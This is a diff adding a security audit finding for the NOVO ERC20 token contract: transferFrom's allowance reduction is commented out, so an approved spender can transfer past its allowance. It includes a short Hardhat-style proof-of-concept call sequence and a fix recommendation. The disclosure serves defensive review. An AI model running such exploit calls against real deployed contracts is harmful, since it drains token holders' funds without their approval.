@@ -1,0 +1,35 @@
+Below is one issue we found:
+
+──────────────────────────────────────────────
+1. Vulnerability: Missing Allowance Reduction in transferFrom (NOVO Contract)
+──────────────────────────────────────────────
+• A key part of an ERC20–style contract is to decrease the spender’s allowance when tokens are transferred via transferFrom. In the NOVO contract the allowance‑reducing code in transferFrom is entirely commented out. (See the commented‐out _approve(…) call in transferFrom.) That means that once an approved spender has been given an allowance, it can spend that amount over and over again (up to the full balance) instead of only using the approved amount.
+• For example, if Alice calls approve(spender, 1000), the spender will be able to call transferFrom(Alice, someAddress, 500) repeatedly—even though after one 500–transfer the remaining approved amount would normally drop to 500.
+• (Approximate location: NOVO contract, function transferFrom around lines 640–670.)
+
+Proof‑of‑Concept (in pseudocode):
+
+  // Assume user “Alice” holds 10,000 NOVO tokens and approves “BadActor” an allowance of 1,000 tokens.
+  // Because the allowance is never reduced, BadActor can repeatedly call transferFrom to transfer 500 tokens per call.
+  //
+// On-chain test (e.g. using Hardhat/Truffle):
+  
+  // 1. Alice approves BadActor for 1000 tokens:
+  await NOVO.connect(alice).approve(badActor.address, ethers.utils.parseUnits("1000", NOVO_DECIMALS));
+  
+  // 2. BadActor transfers 500 tokens from Alice several times:
+  await NOVO.connect(badActor).transferFrom(alice.address, badActor.address, ethers.utils.parseUnits("500", NOVO_DECIMALS));
+  await NOVO.connect(badActor).transferFrom(alice.address, badActor.address, ethers.utils.parseUnits("500", NOVO_DECIMALS));
+  // Already transferred 1000 tokens—but the allowance remains unchanged!
+  await NOVO.connect(badActor).transferFrom(alice.address, badActor.address, ethers.utils.parseUnits("500", NOVO_DECIMALS));  // Unauthorized extra transfer!
+  
+  // As a result, BadActor can drain more tokens from Alice than she approved.
+  
+• Reason: The lack of any update to (_allowances[sender][_msgSender()]) in transferFrom violates the intended transfer‐limits and effectively gives spending power far beyond that approved by the token holder.
+  
+──────────────────────────────────────────────
+
+Fix Recommendation:
+Restore the allowance reduction (or “spend-from‐allowance”) logic by uncommenting or re‑adding the call that subtracts the transferred amount from the approved allowance. This ensures that once a transfer is made, the allowance is reduced accordingly to prevent repeated overuse.
+
+This is our primary access control issue in the supplied code.
